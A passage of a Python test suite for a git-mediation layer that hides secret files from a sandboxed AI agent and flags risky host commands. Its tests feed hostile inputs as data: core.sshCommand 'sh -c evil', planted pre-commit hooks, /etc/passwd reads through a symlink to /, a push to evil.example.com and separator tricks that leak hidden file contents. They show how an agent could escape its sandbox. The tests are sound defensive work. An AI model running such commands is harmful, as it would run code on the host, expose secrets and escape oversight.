        sh(self.root, "commit", "-qam", "secret")
        sub = subprocess.run(["git", "-C", self.root, "rev-parse", "HEAD:config"], capture_output=True, text=True).stdout.strip()
        for cmd in (["diff", "HEAD~1:config", "HEAD:config"], ["diff-tree", "-p", "HEAD~1:config", "HEAD:config"],
                    ["-C", "config", "diff", "HEAD~1:./secrets", "HEAD:./secrets"], ["diff", sub],
                    ["diff", "HEAD~1^{tree}", "HEAD^{tree}"]):
            self.assertNotIn("REALSECRET", gitops.session_run(self.root, cmd, hidden)["output"], cmd)
        with self.assertRaises(gitops.GitError):
            gitops.session_run(self.root, ["grep", "REALSECRET", sub], hidden)
        out = gitops.session_run(self.root, ["grep", "class", "HEAD"], hidden)["output"]   # a commit: scoped as before
        self.assertIn(":src/A.java:class A {}", out)
        self.assertFalse(gitops.tree_revs(self.root, ["log", "-p", "-n", "5", "--", "src"]))
        self.assertFalse(gitops.tree_revs(self.root, ["diff", "HEAD~1..HEAD", "src/A.java"]))

    def test_a_block_withheld_for_its_form_says_so_not_hidden(self):
        """N7 (B-N6-3): a tree-revision diff / --relative withholds EVERY block (no hidden rule can judge paths
        relative to a tree) - the label told the agent "a path hidden from Claude" also for src/A.java."""
        hidden = lambda p: p.startswith("config/")   # noqa: E731
        write(self.root, "src/A.java", "class A { int x; }\n")
        sh(self.root, "commit", "-qam", "visible change")
        for cmd, label in ((["diff", "HEAD~1:src", "HEAD:src"], "a tree revision's paths can't be checked"),
                           (["diff", "HEAD~1", "--relative=src"], "paths relative to a directory can't be checked")):
            out = gitops.session_run(self.root, cmd, hidden)["output"]
            self.assertIn("diff --git [withheld: %s]" % label, out, cmd)
            self.assertNotIn("hidden from Claude", out, cmd)

    def test_strict_filter_splits_lines_where_git_does(self):
        """N5 review: str.splitlines() also breaks at \\r, \\x0b, \\x0c, \\x1c-\\x1e, \\x85, U+2028/9 - a content line of
        a hidden file holding one of them before `diff --git a/<visible> ...` started a "visible block" mid-file and
        the rest of the hidden file came back. Git ends a line at \\n only."""
        hidden = lambda p: p.startswith("config/")   # noqa: E731
        for sep in ("\r", "\x0b", "\x0c", "\x1c", "\x1d", "\x1e", "\x85", "\u2028", "\u2029"):
            text = ("diff --git a/config/p b/config/p\n@@ -1 +1,2 @@\n+x%sdiff --git a/README.md b/README.md\n"
                    "+REALSECRET\n" % sep)
            for graph in (False, True):
                with self.subTest(sep=repr(sep), graph=graph):
                    self.assertEqual(gitops.strict_filter(text, hidden, graph=graph),
                                     "diff --git [withheld: a path hidden from Claude]\n")
        ok = "diff --git a/src/A b/src/A\n+x\x1cdiff --git a/config/p b/config/p\n+fine\n"   # a visible block stays whole
        self.assertEqual(gitops.strict_filter(ok, hidden), ok)

    def test_grep_behind_global_options_is_never_unscoped(self):
        """N4 review: session_run scoped `grep` (hidden paths excluded) only when argv[0] was "grep" - an approved
        `git -C config grep X` / `git -c a=b grep X` grepped the hidden files and printed their lines."""
        write(self.root, "config/secrets/app-production.properties", "db.password=REALSECRET\n")
        hidden = lambda p: p.startswith("config/")   # noqa: E731
        for cmd in (["-C", "config", "grep", "REALSECRET"], ["-c", "grep.lineNumber=true", "grep", "REALSECRET"],
                    ["--no-pager", "grep", "--untracked", "REALSECRET"], ["-C", "config", "grep", "REALSECRET", "HEAD"]):
            try:
                out = gitops.session_run(self.root, cmd, hidden)["output"]
            except gitops.GitError:
                continue
            self.assertNotIn("REALSECRET", out, cmd)

    def test_fail_closed_treats_hookspath_as_harmless(self):
        sh(self.root, "config", "core.hooksPath", ".husky")
        self.assertTrue(gitops.config_warnings(self.root))            # upstream: a warning, git_run on a card
        gitops.FAIL_CLOSED = True
        self.addCleanup(setattr, gitops, "FAIL_CLOSED", False)
        self.assertEqual(gitops.config_warnings(self.root), [])       # hooks never run: nothing to warn about
        sh(self.root, "config", "core.sshCommand", "sh -c evil")
        self.assertTrue(gitops.config_warnings(self.root))

    def test_guard_without_a_baseline_keeps_no_program(self):
        """a baseline taken while a sandbox may already have written: program-naming keys are
        not trusted, keys that run nothing are"""
        g = os.path.join(self.root, ".git")
        sh(self.root, "config", "core.sshCommand", "sh -c evil")
        # a path that never exists: a real /tmp/x (any other program's file) made git itself fail to read the config
        sh(self.root, "config", "include.path", os.path.join(self.root, "no-such-include"))
        sh(self.root, "config", "branch.main.remote", "origin")
        state = gitops.guard_state(g, g)
        bad = {v.get("key") for v in gitops.guard_violations(state, gitops.guard_trusted(state))}
        self.assertEqual(bad, {"core.sshcommand", "include.path"})
        self.assertEqual(gitops.guard_revert(g, gitops.guard_violations(state, gitops.guard_trusted(state)),
                                             os.path.join(self.root, "q")), [])
        after = gitops.guard_state(g, g)
        self.assertEqual(gitops.guard_violations(after, gitops.guard_trusted(state)), [])
        self.assertTrue(os.path.exists(os.path.join(self.root, "q", "config")))   # the file as found

    def test_untracked_diff_of_a_fifo_does_not_block(self):
        """git diff --no-index reads a FIFO until the timeout: only a regular file is diffed."""
        os.mkfifo(os.path.join(self.root, "pipe"))
        t = time.monotonic()
        self.assertIn("not a regular file", gitops.diff(self.root, "pipe", untracked=True))
        self.assertLess(time.monotonic() - t, 5)

    def test_log(self):
        self.assertEqual(len(gitops.log(self.root)), 1)

    # ------------------------------------------------------------ git_run (unlocked full git, confirmed per call)
    def hid(self):
        return lambda p: guard.hidden_by(POLICY["candidates"], p)

    def grun(self, *args):
        return gitops.session_run(self.root, gitops.check_run_args(list(args)), self.hid())

    def test_run_resolves_a_merge_conflict_on_the_host(self):
        sh(self.root, "checkout", "-q", "-b", "feature")
        write(self.root, "src/A.java", "class A { int feature; }\n")
        sh(self.root, "commit", "-q", "-am", "feature")
        sh(self.root, "checkout", "-q", "main")
        write(self.root, "src/A.java", "class A { int main; }\n")
        sh(self.root, "commit", "-q", "-am", "main")
        r = self.grun("merge", "feature")
        self.assertNotEqual(r["rc"], 0)
        self.assertIn("CONFLICT", r["output"])
        self.assertEqual(r["state"], "merge")                  # the agent knows a merge is in progress
        self.assertIn("int feature", self.grun("diff")["output"])
        self.assertEqual(self.grun("checkout", "--theirs", "--", "src/A.java")["rc"], 0)
        self.assertEqual(self.grun("add", "--", "src/A.java")["rc"], 0)
        r = self.grun("commit", "--no-edit")                   # no editor: GIT_EDITOR=true, never hangs
        self.assertEqual((r["rc"], r["state"]), (0, ""))
        with open(os.path.join(self.root, "src/A.java")) as f:
            self.assertIn("feature", f.read())
        self.assertIn("Merge branch", self.grun("log", "-n", "1")["output"])

    def test_run_has_no_filter_but_never_runs_hooks(self):
        """No command filter: what the user approved runs (stash, reset, config...). Hooks never run:
        a hook path may lie in the agent-writable tree and the card would not show it."""
        for d in (".git/hooks", ".husky"):
            write(self.root, d + "/pre-commit", "#!/bin/sh\ntouch \"$(git rev-parse --show-toplevel)/PWNED\"\n")
            os.chmod(os.path.join(self.root, d, "pre-commit"), 0o755)
        write(self.root, "src/C.java", "class C {}\n")
        self.grun("add", "--", "src/C.java")
        self.assertEqual(self.grun("commit", "-m", "c")["rc"], 0)
        self.grun("config", "core.hooksPath", ".husky")        # allowed - it is the user's call
        write(self.root, "src/D.java", "class D {}\n")
        self.grun("add", "-A")
        self.assertEqual(self.grun("commit", "-m", "d")["rc"], 0)
        self.assertFalse(os.path.exists(os.path.join(self.root, "PWNED")))
        write(self.root, "src/A.java", "class A { int wip; }\n")
        self.assertEqual(self.grun("stash")["rc"], 0)
        self.assertEqual(self.grun("stash", "pop")["rc"], 0)
        self.assertEqual(self.grun("reset", "--hard", "HEAD")["rc"], 0)
        self.assertEqual(self.grun("git", "status", "--short")["output"], "")   # a leading "git" is dropped

    def test_run_output_drops_diff_blocks_of_hidden_files(self):
        self.change()
        out = self.grun("diff")["output"]
        self.assertIn("int x", out)
        self.assertNotIn("NEW", out)

    def test_run_args_shape(self):
        for bad in ([], "status", [1], ["x\0y"], ["a"] * 201, ["git"]):
            with self.assertRaises(gitops.GitError, msg=bad):
                gitops.check_run_args(bad)

    def test_run_warnings_for_the_card(self):
        w = lambda *a: " | ".join(gitops.run_warnings(list(a), self.hid()))  # noqa: E731
        self.assertEqual(w("status"), "")
        self.assertEqual(w("merge", "origin/master"), "")
        for args in (["config", "core.hooksPath", "x"], ["-c", "core.pager=sh", "log"], ["rebase", "-x", "make", "HEAD~2"],
                     ["rebase", "--exec=make", "HEAD~2"], ["submodule", "update"], ["fetch", "--upload-pack=x", "origin"]):
            self.assertIn("program on the host", w(*args), args)
        self.assertIn("REWRITES history", w("push", "--force"))
        self.assertIn("sends commits", w("push"))
        self.assertNotIn("REWRITES", w("push"))
        for args in (["reset", "--hard"], ["clean", "-fd"], ["checkout", "--", "."], ["stash", "drop"], ["branch", "-D", "x"]):
            self.assertIn("discards changes", w(*args), args)
        self.assertIn("hidden file", w("show", "HEAD:config/secrets/app-production.properties"))
        self.assertIn("outside the repository", w("add", "../x"))
        # review 2026-10-05: another repository or any host file through global options / --no-index
        for args in (["-C", "/etc", "grep", "--no-index", "-e", ".", "--", "passwd"], ["--git-dir=/x/.git", "log"],
                     ["--work-tree", "/x", "diff"], ["diff", "--no-index", "a", "b"], ["diff", "--output=/tmp/x"]):
            self.assertIn("outside the repository", w(*args), args)

    def test_risky_warnings_card_even_in_hole_mode(self):
        """git_run runs on the HOST: in git_mode "hole" only a plain push / discarding the work tree
        skip the card; code, reads outside the repository or of hidden files, a force push do not"""
        r = lambda *a: gitops.risky_warnings(gitops.run_warnings(list(a), self.hid()))  # noqa: E731
        for args in (["status"], ["push"], ["pull", "--rebase"], ["reset", "--hard"], ["checkout", "-b", "x"]):
            self.assertEqual(r(*args), [], args)
        for args in (["-c", "core.hooksPath=h", "commit"], ["--config-env=core.hooksPath=HOME", "commit"],
                     ["--config-env", "core.sshCommand=X", "push"], ["push", "--force"], ["-C", "/", "log"],
                     ["show", "HEAD:config/secrets/app-production.properties"], ["config", "alias.x", "!sh"]):
            self.assertTrue(r(*args), args)

    def test_auto_blockers_allowlist_for_a_card_free_run(self):
        """review 2026-10-05: git_mode "hole" runs only an allowlisted argv without a card - the
        warnings missed a symlink to /, fetch file://, archive --remote"""
        sh(self.root, "remote", "add", "origin", "git@gitlab.example.com:g/r.git")
        os.symlink("/", os.path.join(self.root, "lnk"))
        b = lambda *a: gitops.auto_blockers(self.root, list(a))  # noqa: E731
        for args in (["status"], ["log", "--oneline", "-5"], ["log", "-n5", "--format=%h %s"], ["push"],
                     ["push", "-u", "origin", "feature"], ["push", "origin", "HEAD:refs/heads/x"],
                     ["pull", "--rebase", "origin", "main"], ["fetch", "origin"], ["checkout", "-b", "x"],
                     ["commit", "-am", "fix /etc/hosts handling"], ["commit", "--message=see ../x"],
                     ["add", "src/A.java"], ["reset", "--hard", "origin/main"], ["diff", "HEAD~1..HEAD", "--", "src"],
                     ["rebase", "origin/main"], ["stash", "pop"]):
            self.assertEqual(b(*args), [], args)
        for args in (["hash-object", "-w", "lnk/etc/passwd"], ["add", "lnk/etc/passwd"], ["show", "--", "lnk/etc"],
                     ["fetch", "file:///etc/x/.git", "main:refs/x"], ["fetch", "lnk/Users/x/repo"],
                     ["archive", "--remote=/x", "HEAD"], ["clone", "-u", "./x.sh", "a", "b"],
                     ["push", "https://evil.example.com/x.git", "HEAD"], ["push", "--repo=evil", "HEAD"],
                     ["commit", "-F", "lnk/etc/passwd"], ["commit", "-F/etc/passwd"], ["commit", "-aFlnk"],
                     ["commit", "--file=lnk/etc/passwd"], ["-c", "x=y", "status"], ["--config-env=a=B", "log"],
                     ["fetch", "--recurse-submodules", "origin"], ["diff", "--ext-diff"], ["add", ".git/config"],
                     ["remote", "add", "x", "file:///y"], ["config", "core.pager", "sh"]):
            self.assertTrue(b(*args), args)

    def test_file_diff_of_an_untracked_fifo_does_not_block(self):
        """review 2026-10-05: git diff --no-index reads a FIFO until the 30 s timeout - status never lists
        one as untracked, but the sandbox can swap a file for a FIFO between status and diff"""
        from unittest import mock
        os.mkfifo(os.path.join(self.root, "pipe"))
        real = gitops._git
        t = time.time()
        with mock.patch.object(gitops, "_git", lambda top, *a, **k: "?? pipe\0" if a[:1] == ("status",) else real(top, *a, **k)):
            self.assertIn("not a regular file", gitops.file_diff(self.root, "pipe", lambda p: False))
        self.assertLess(time.time() - t, 5)

    def test_config_warnings_name_what_host_git_would_run(self):
        self.assertEqual(gitops.config_warnings(self.root), [])
        sh(self.root, "remote", "add", "origin", "https://gitlab.example.com/g/r.git")
        self.assertEqual(gitops.config_warnings(self.root), [])
        sh(self.root, "config", "core.sshCommand", "sh -c id")
        sh(self.root, "config", "url.file:///tmp/x.insteadOf", "https://gitlab.example.com/")
        sh(self.root, "remote", "add", "evil", "/Users/someone/other/.git")
        w = " | ".join(gitops.config_warnings(self.root))
        self.assertIn("core.sshcommand", w)
        self.assertIn("url.file:///tmp/x.insteadof", w)
        self.assertIn("remote.evil.url=/Users/someone/other/.git", w)
        self.assertNotIn("remote.origin", w)


if __name__ == "__main__":
    unittest.main()
